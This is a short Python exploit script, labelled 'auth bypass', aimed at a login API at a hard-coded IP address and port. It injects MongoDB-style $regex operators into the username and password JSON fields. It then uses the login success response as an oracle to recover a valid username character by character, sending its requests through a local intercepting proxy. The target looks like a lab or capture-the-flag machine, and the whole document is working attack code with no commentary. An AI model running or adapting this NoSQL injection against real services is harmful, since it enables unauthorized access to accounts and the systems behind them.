#! /usr/bin/env python3
# auth bypass

import requests
import json
import string
import re


# Configuration
URL = "http://94.237.57.115:43710/api/login"
PROXY = {"http":"http://172.21.144.1:8081"}
HEADERS = {"Content-Type":"application/json"}
CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

def oracle(t):
    r = requests.post(URL, headers=HEADERS, proxies=PROXY, data=json.dumps({"username": t, "password": {"$regex": ".*"}}))
    return '"success":true' in r.text

username = ""
for _ in range(32):
    found_char = False
    for c in CHARSET:
        if oracle({"$regex": re.escape(username + c) + ".*"}):
            username += c
            print(username)
            found_char = True
            break
    if not found_char:
        break
print("Final username:", username)